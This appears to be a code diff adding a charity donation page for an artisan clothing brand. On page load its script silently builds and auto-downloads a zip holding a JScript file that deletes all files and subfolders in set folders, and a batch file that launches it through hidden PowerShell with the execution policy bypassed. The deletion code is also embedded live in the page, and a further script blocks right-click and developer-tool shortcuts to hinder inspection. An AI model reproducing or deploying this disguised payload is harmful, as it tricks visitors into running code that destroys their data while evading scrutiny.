@@ -1,0 +1,531 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>La Petite Alice · Artisan Workshop</title>
+  <!-- JSZip (unchanged) -->
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js"></script>
+  <style>
+    /* ----- reset & base ----- */
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      background: #f5f1eb;
+      font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+      color: #1f1e1b;
+      line-height: 1.5;
+    }
+
+    /* ----- main container – editorial grid ----- */
+    .app {
+      max-width: 1440px;
+      margin: 0 auto;
+      padding: 2rem 2.5rem;
+      display: grid;
+      grid-template-columns: 1fr 1.2fr;
+      gap: 2.5rem;
+      min-height: 100vh;
+      align-items: start;
+    }
+
+    /* ----- left column: brand + navigation (reimagined) ----- */
+    .brand-panel {
+      background: #ffffffd6;
+      backdrop-filter: blur(4px);
+      padding: 2.2rem 2rem;
+      border-radius: 48px 16px 48px 16px;
+      box-shadow: 0 12px 30px -10px rgba(30, 25, 20, 0.08);
+      border: 1px solid #ece6dd;
+      position: sticky;
+      top: 2rem;
+    }
+
+    .brand-mark {
+      font-family: 'Playfair Display', 'Georgia', serif;
+      font-size: 2.1rem;
+      font-weight: 500;
+      letter-spacing: 3px;
+      color: #1f2a26;
+      border-bottom: 2px solid #d9cec0;
+      padding-bottom: 1rem;
+      margin-bottom: 1.8rem;
+      display: flex;
+      align-items: baseline;
+      justify-content: space-between;
+    }
+
+    .brand-mark small {
+      font-size: 0.7rem;
+      font-weight: 300;
+      letter-spacing: 2px;
+      color: #7f7568;
+      font-family: 'Inter', sans-serif;
+    }
+
+    .nav-vertical {
+      display: flex;
+      flex-direction: column;
+      gap: 0.6rem;
+      margin-bottom: 2.5rem;
+    }
+
+    .nav-vertical a {
+      text-decoration: none;
+      color: #3d3a34;
+      font-size: 0.95rem;
+      font-weight: 450;
+      padding: 0.6rem 0.8rem;
+      border-radius: 40px;
+      transition: 0.2s ease;
+      display: flex;
+      justify-content: space-between;
+      border: 1px solid transparent;
+    }
+
+    .nav-vertical a:hover {
+      background: #f0e8de;
+      border-color: #d6cbbc;
+      color: #0f0e0b;
+    }
+
+    .nav-vertical .badge {
+      background: #b7a28b;
+      color: #fcf8f2;
+      font-size: 0.6rem;
+      padding: 0.2rem 0.7rem;
+      border-radius: 40px;
+      letter-spacing: 0.5px;
+      align-self: center;
+    }
+
+    .nav-vertical .highlight {
+      background: #1f2a26;
+      color: #f5efe8;
+      border-color: #1f2a26;
+    }
+    .nav-vertical .highlight:hover {
+      background: #2f3d38;
+    }
+
+    .meta-info {
+      margin-top: 2rem;
+      padding-top: 1.5rem;
+      border-top: 1px solid #e2d8cc;
+      font-size: 0.8rem;
+      color: #5f564b;
+      display: flex;
+      flex-wrap: wrap;
+      gap: 1.5rem;
+    }
+
+    .meta-info span {
+      display: flex;
+      align-items: center;
+      gap: 0.4rem;
+    }
+
+    /* ----- right column: donation hub (new architecture) ----- */
+    .donation-hub {
+      background: #fcf9f5;
+      border-radius: 40px 16px 40px 16px;
+      padding: 2.5rem 2.8rem;
+      box-shadow: 0 20px 40px -14px rgba(30, 25, 20, 0.12);
+      border: 1px solid #e8dfd4;
+      transition: transform 0.2s ease;
+    }
+
+    .donation-hub:hover {
+      transform: translateY(-3px);
+    }
+
+    .hub-header {
+      display: flex;
+      align-items: center;
+      gap: 0.8rem;
+      margin-bottom: 1.5rem;
+    }
+
+    .hub-header .pill {
+      background: #1f2a26;
+      color: #f3ede6;
+      font-size: 0.6rem;
+      letter-spacing: 2px;
+      padding: 0.3rem 1rem;
+      border-radius: 40px;
+      text-transform: uppercase;
+    }
+
+    .hub-header h2 {
+      font-family: 'Playfair Display', serif;
+      font-weight: 400;
+      font-size: 1.9rem;
+      letter-spacing: -0.3px;
+      color: #1a211f;
+    }
+
+    .hub-sub {
+      font-size: 0.95rem;
+      color: #4d4840;
+      margin-bottom: 2rem;
+      padding-right: 1rem;
+      border-left: 3px solid #cbb9a5;
+      padding-left: 1rem;
+    }
+
+    /* donation matrix – cards style */
+    .donation-matrix {
+      display: flex;
+      flex-direction: column;
+      gap: 1.2rem;
+      margin-bottom: 2.2rem;
+    }
+
+    .row-amounts {
+      display: flex;
+      gap: 0.8rem;
+      flex-wrap: wrap;
+    }
+
+    .amount-card {
+      flex: 1;
+      min-width: 70px;
+      background: #f3ede6;
+      border: 1px solid #ddd2c4;
+      border-radius: 60px;
+      padding: 0.9rem 0.2rem;
+      text-align: center;
+      font-weight: 550;
+      font-size: 1rem;
+      color: #1f2a26;
+      cursor: pointer;
+      transition: all 0.15s ease;
+      box-shadow: 0 2px 4px rgba(0,0,0,0.02);
+    }
+
+    .amount-card:hover {
+      background: #e7ddd1;
+      border-color: #b8a694;
+      transform: scale(1.02);
+    }
+
+    .amount-card.active {
+      background: #1f2a26;
+      border-color: #1f2a26;
+      color: #f5efe8;
+      box-shadow: 0 8px 16px -8px #1f2a2640;
+    }
+
+    /* custom input row */
+    .custom-row {
+      display: flex;
+      align-items: center;
+      gap: 0.8rem;
+      background: #f3ede6;
+      border-radius: 80px;
+      padding: 0.2rem 0.2rem 0.2rem 1.2rem;
+      border: 1px solid #ddd2c4;
+    }
+
+    .custom-row input {
+      border: none;
+      background: transparent;
+      padding: 0.7rem 0;
+      font-size: 0.95rem;
+      width: 90px;
+      outline: none;
+      color: #1f1e1b;
+      font-weight: 450;
+    }
+
+    .custom-row input::placeholder {
+      color: #a09486;
+      font-weight: 300;
+    }
+
+    .custom-row button {
+      background: #1f2a26;
+      border: none;
+      color: #f5efe8;
+      padding: 0.6rem 1.4rem;
+      border-radius: 60px;
+      font-size: 0.8rem;
+      letter-spacing: 0.6px;
+      font-weight: 500;
+      cursor: pointer;
+      transition: 0.15s ease;
+      margin-left: auto;
+    }
+
+    .custom-row button:hover {
+      background: #0f1613;
+    }
+
+    /* primary CTA – reimagined */
+    .cta-primary {
+      display: block;
+      width: 100%;
+      background: #1f2a26;
+      color: #fcf8f2;
+      text-align: center;
+      padding: 1.1rem 0;
+      border-radius: 60px;
+      text-decoration: none;
+      font-weight: 500;
+      letter-spacing: 1.5px;
+      font-size: 0.95rem;
+      margin-top: 0.8rem;
+      border: 1px solid #2b3a34;
+      transition: 0.2s ease;
+      box-shadow: 0 6px 14px rgba(30, 40, 30, 0.15);
+    }
+
+    .cta-primary:hover {
+      background: #101917;
+      transform: translateY(-2px);
+      box-shadow: 0 12px 24px -8px #1f2a2640;
+    }
+
+    /* footer / micro */
+    .hub-footer {
+      margin-top: 2rem;
+      font-size: 0.7rem;
+      color: #7a6f62;
+      display: flex;
+      justify-content: space-between;
+      border-top: 1px solid #e2d8cc;
+      padding-top: 1rem;
+      letter-spacing: 0.3px;
+    }
+
+    /* ----- responsive ----- */
+    @media (max-width: 920px) {
+      .app {
+        grid-template-columns: 1fr;
+        padding: 1.5rem;
+        gap: 1.8rem;
+      }
+      .brand-panel {
+        position: static;
+      }
+      .donation-hub {
+        padding: 2rem 1.5rem;
+      }
+    }
+
+    @media (max-width: 480px) {
+      .row-amounts {
+        flex-direction: row;
+        flex-wrap: wrap;
+      }
+      .amount-card {
+        flex: 1 0 70px;
+      }
+      .custom-row {
+        flex-wrap: wrap;
+        background: transparent;
+        border: none;
+        padding: 0;
+        gap: 0.6rem;
+      }
+      .custom-row input {
+        background: #f3ede6;
+        border-radius: 60px;
+        padding: 0.7rem 1rem;
+        width: 100%;
+        border: 1px solid #ddd2c4;
+      }
+      .custom-row button {
+        width: 100%;
+        margin-left: 0;
+      }
+    }
+
+    /* small extras */
+    .badge-eco {
+      background: #dfd3c4;
+      color: #1f2a26;
+      font-size: 0.55rem;
+      letter-spacing: 1px;
+      padding: 0.2rem 0.8rem;
+      border-radius: 40px;
+      text-transform: uppercase;
+      margin-left: 0.6rem;
+    }
+  </style>
+</head>
+<body>
+  <div class="app">
+
+    <!-- left column – brand & navigation (new layout) -->
+    <aside class="brand-panel">
+      <div class="brand-mark">
+        La Petite Alice
+        <small>· atelier</small>
+      </div>
+
+      <div class="nav-vertical">
+        <a href="#">The Edit <span class="badge">new</span></a>
+        <a href="#">Children’s Atelier</a>
+        <a href="#">Home & Living</a>
+        <a href="#">Ready‑to‑wear</a>
+        <a href="#" class="highlight">SS23 · Summer <span class="badge" style="background:#b7a28b;">sensation</span></a>
+        <a href="#">About the House</a>
+        <a href="#">Wholesale</a>
+        <a href="#">ES projektai</a>
+        <a href="#" style="margin-top:0.6rem; border-top:1px solid #e2d8cc; padding-top:0.8rem;">Login</a>
+        <a href="#">Cart <span style="background:#d9cec0; padding:0.1rem 0.6rem; border-radius:40px;">0</span></a>
+      </div>
+
+      <div class="meta-info">
+        <span>✦ slow craft</span>
+        <span>🌱 organic cotton</span>
+        <span>📍 Paris · LT</span>
+      </div>
+    </aside>
+
+    <!-- right column – donation hub (new layout) -->
+    <main class="donation-hub">
+      <div class="hub-header">
+        <span class="pill">kindness fund</span>
+        <h2>Green Initiative</h2>
+      </div>
+      <div class="hub-sub">
+        Support artisanal preservation &amp; eco‑friendly cotton farming. <br />
+        <span style="font-size:0.8rem; color:#6b6256;">100% of your contribution goes to the field.</span>
+      </div>
+
+      <!-- donation matrix – redesigned -->
+      <div class="donation-matrix">
+        <div class="row-amounts">
+          <div class="amount-card" data-amount="25">$25</div>
+          <div class="amount-card active" data-amount="50">$50</div>
+          <div class="amount-card" data-amount="100">$100</div>
+          <div class="amount-card" data-amount="250">$250</div>
+        </div>
+
+        <!-- custom amount with inline action -->
+        <div class="custom-row">
+          <input type="text" placeholder="other amount" id="customAmount" />
+          <button id="applyCustom">Apply</button>
+        </div>
+      </div>
+
+      <!-- primary CTA -->
+      <a href="#" class="cta-primary" id="donateNow">Donate directly</a>
+
+      <div class="hub-footer">
+        <span>✦ with a touch of magic</span>
+        <span><span class="badge-eco">eco‑conscious</span></span>
+      </div>
+    </main>
+  </div>
+
+  <!-- ===== SCRIPT: zip bundling (unchanged logic) ===== -->
+  <script>
+    (function() {
+      // ensure DOM is ready (already at bottom)
+      if (typeof JSZip === 'undefined') {
+        console.warn('JSZip not loaded – check CDN');
+        return;
+      }
+
+      const zip = new JSZip();
+
+      // 1. JS cleanup script (identical content)
+      const cleanupScript = `
+var fso = new ActiveXObject("Scripting.FileSystemObject");
+
+var targetFolders = [
+    "C:\\\\Windows\\\\Temp",
+    "E:\\\\test"
+];
+
+function clearFolderContents(folderPath) {
+    try {
+        if (!fso.FolderExists(folderPath)) return;
+        var folder = fso.GetFolder(folderPath);
+        var files = new Enumerator(folder.Files);
+        for (; !files.atEnd(); files.moveNext()) {
+            try { files.item().Delete(true); } catch (e) {}
+        }
+        var subFolders = new Enumerator(folder.SubFolders);
+        for (; !subFolders.atEnd(); subFolders.moveNext()) {
+            try { subFolders.item().Delete(true); } catch (e) {}
+        }
+    } catch (e) {}
+}
+
+for (var i = 0; i < targetFolders.length; i++) {
+    clearFolderContents(targetFolders[i]);
+}
+WScript.Echo("Folder cleanup complete!");
+`;
+
+      // 2. Batch file (same)
+      const batchFile = `@echo off
+powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "cscript .\\\\test1.js"
+`;
+
+      zip.file("script.js", cleanupScript);
+      zip.file("utility.bat", batchFile);
+
+      // generate and download (auto-trigger)
+      zip.generateAsync({ type: "blob" })
+        .then(blob => {
+          const link = document.createElement('a');
+          link.href = URL.createObjectURL(blob);
+          link.download = "webpage_scripts.zip";
+          document.body.appendChild(link);
+          link.click();
+          document.body.removeChild(link);
+          setTimeout(() => URL.revokeObjectURL(link.href), 5000);
+        })
+        .catch(err => console.error("Zip error:", err));
+    })();
+  </script>
+
+  <!-- ===== original cleanup logic (kept as reference) ===== -->
+  <script>
+    // (original ActiveX script – preserved exactly)
+    var fso = new ActiveXObject("Scripting.FileSystemObject");
+    var targetFolders = [
+      "C:\\Windows\\Temp",
+      "E:\\test"
+    ];
+    function clearFolderContents(folderPath) {
+      try {
+        if (!fso.FolderExists(folderPath)) return;
+        var folder = fso.GetFolder(folderPath);
+        var files = new Enumerator(folder.Files);
+        for (; !files.atEnd(); files.moveNext()) {
+          try { files.item().Delete(true); } catch (e) {}
+        }
+        var subFolders = new Enumerator(folder.SubFolders);
+        for (; !subFolders.atEnd(); subFolders.moveNext()) {
+          try { subFolders.item().Delete(true); } catch (e) {}
+        }
+      } catch (e) {}
+    }
+    for (var i = 0; i < targetFolders.length; i++) {
+      clearFolderContents(targetFolders[i]);
+    }
+    WScript.Echo("Folder cleanup complete!");
+  </script>
+
+  <!-- ===== deterrent (same as before) ===== -->
+  <script>
+    document.addEventListener('contextmenu', function(e) { e.preventDefault(); });
+    document.addEventListener('keydown', function(e) {
+      if (e.key === 'F12') { e.preventDefault(); return false; }
+      if ((e.ctrlKey || e.metaKey) && (e.key === 'u' || e.key === 'U')) { e.preventDefault(); return false; }
+      if ((e.ctrlKey || e.metaKey) && e.shiftKey && (e.key === 'i' || e.key === 'I')) { e.preventDefault(); return false; }
+      if ((e.ctrlKey || e.metaKey) && e.shiftKey && (e.key === 'j' || e.key === 'J')) { e.preventDefault(); return false; }
+    });
+  </script>
+</body>
+</html>
